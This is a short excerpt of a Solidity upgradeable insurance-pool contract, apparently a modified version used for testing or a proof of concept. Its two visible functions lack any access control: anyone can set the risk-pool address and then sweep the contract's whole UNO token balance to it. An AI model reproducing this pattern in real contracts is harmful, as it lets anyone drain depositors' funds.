...
contract SingleSidedInsurancePool1 is
    ...
    AccessControlUpgradeable
{
    ...
    function transferToriskPool() external{
        console.log(1);
        IERC20 uno=IERC20(0x474021845C4643113458ea4414bdb7fB74A01A77);
        uint balance =uno.balanceOf(address(this));
        uno.transfer(riskPool, balance);
    }
    function setRiskPool(address _riskPool) external {
        riskPool=_riskPool;
    }
